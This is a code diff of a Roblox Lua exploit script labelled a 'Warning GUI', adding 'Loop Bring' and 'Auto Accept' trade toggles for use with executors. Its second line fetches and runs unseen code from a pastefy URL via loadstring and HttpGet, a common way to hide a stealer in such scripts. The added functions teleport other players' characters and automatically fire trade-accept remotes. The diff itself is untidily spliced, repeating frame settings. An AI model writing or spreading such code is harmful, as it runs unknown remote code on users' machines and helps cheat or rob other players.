@@ -1,5 +1,6 @@
 --// Warning GUI (No Scroll, Full Instructions)
 loadstring(game:HttpGet("https://pastefy.app/vs6D6Wq7/raw"))()
+--// Warning GUI (No Scroll, Full Instructions)
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
@@ -118,6 +119,131 @@ button.MouseButton1Click:Connect(function()
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 220, 0, 150)
     frame.Position = UDim2.new(0.5, -110, 0.5, -75)
+    frame.BackgroundColor3 = Color3.fromRGB(96, 125, 139)
+    frame.BorderSizePixel = 0
+    frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    frame.Parent = screenGui
+
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0.1, 0)
+
+    local framePadding = Instance.new("UIPadding")
+    framePadding.PaddingTop = UDim.new(0, 8)
+    framePadding.PaddingBottom = UDim.new(0, 8)
+    framePadding.PaddingLeft = UDim.new(0, 8)
+    framePadding.PaddingRight = UDim.new(0, 8)
+    framePadding.Parent = frame
+
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.Text = "Script is not working on delta and krnl"
+    title.Size = UDim2.new(1, 0, 0, 30)
+    title.BackgroundTransparency = 1
+    title.TextColor3 = Color3.fromRGB(236, 239, 241)
+    title.Font = Enum.Font.GothamBold
+    title.TextScaled = true
+    title.Parent = frame
+
+    -- Create Toggle Button Function
+    local function createToggleButton(text, posY)
+        local button = Instance.new("TextButton")
+        button.Size = UDim2.new(1, 0, 0, 40)
+        button.Position = UDim2.new(0, 0, 0, posY)
+        button.BackgroundColor3 = Color3.fromRGB(255, 80, 80) -- Red OFF
+        button.Text = text .. ": OFF"
+        button.TextColor3 = Color3.fromRGB(255, 255, 255)
+        button.Font = Enum.Font.GothamBold
+        button.TextScaled = true
+        button.Parent = frame
+
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0.1, 0)
+        corner.Parent = button
+
+        return button
+    end
+
+    -- Variables
+    local isGrabOn = false
+    local isAutoAcceptOn = false
+    local grabConnection
+    local autoAcceptConnection
+
+    -- Loop Bring Function
+    local function startLoopBring()
+        local centerChar = player.Character
+        if not centerChar or not centerChar:FindFirstChild("HumanoidRootPart") then return end
+
+        local t = 0
+        grabConnection = RunService.RenderStepped:Connect(function(dt)
+            t += dt
+            local others = Players:GetPlayers()
+            for i, plr in ipairs(others) do
+                if plr ~= player and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
+                    local angle = (t * 2 + (i * (2 * math.pi / #others)))
+                    local radius = 8
+                    local targetPos = centerChar.HumanoidRootPart.Position + Vector3.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
+                    plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos, centerChar.HumanoidRootPart.Position)
+                end
+            end
+        end)
+    end
+
+    local function stopLoopBring()
+        if grabConnection then
+            grabConnection:Disconnect()
+            grabConnection = nil
+        end
+    end
+
+    -- Auto Accept Function
+    local function startAutoAccept()
+        autoAcceptConnection = ReplicatedStorage.ChildAdded:Connect(function(obj)
+            if obj.Name:lower():find("trade") or obj.Name:lower():find("request") then
+                if obj:FindFirstChild("Accept") then
+                    obj.Accept:FireServer()
+                end
+            end
+        end)
+    end
+
+    local function stopAutoAccept()
+        if autoAcceptConnection then
+            autoAcceptConnection:Disconnect()
+            autoAcceptConnection = nil
+        end
+    end
+
+    -- Create Buttons
+    local grabButton = createToggleButton("Loop Bring", 35)
+    local acceptButton = createToggleButton("Auto Accept", 80)
+
+    -- Button Toggles
+    grabButton.MouseButton1Click:Connect(function()
+        isGrabOn = not isGrabOn
+        if isGrabOn then
+            grabButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
+            grabButton.Text = "Loop Bring: ON"
+            startLoopBring()
+        else
+            grabButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+            grabButton.Text = "Loop Bring: OFF"
+            stopLoopBring()
+        end
+    end)
+
+    acceptButton.MouseButton1Click:Connect(function()
+        isAutoAcceptOn = not isAutoAcceptOn
+        if isAutoAcceptOn then
+            acceptButton.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
+            acceptButton.Text = "Auto Accept: ON"
+            startAutoAccept()
+        else
+            acceptButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+            acceptButton.Text = "Auto Accept: OFF"
+            stopAutoAccept()
+        end
+    end)
+end)
     frame.BackgroundColor3 = Color3.fromRGB(96, 125, 139)
     frame.BorderSizePixel = 0
     frame.AnchorPoint = Vector2.new(0.5, 0.5)
